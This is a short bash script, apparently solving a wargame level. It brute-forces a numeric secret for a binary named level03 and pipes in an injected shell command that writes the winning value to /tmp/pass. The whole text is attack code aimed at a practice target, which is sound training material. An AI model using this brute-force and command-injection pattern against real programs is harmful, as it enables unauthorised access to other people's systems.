i=322424845

while true
do
	if [ -f /tmp/pass ]; then
		echo "Here is your pass:"
		cat /tmp/pass
		return ;
	fi
	(python -c "print($i)"; python -c "print('echo $i > /tmp/pass')") 2>/dev/null | ~/level03 1>/dev/null
	i=$((i-1))
done

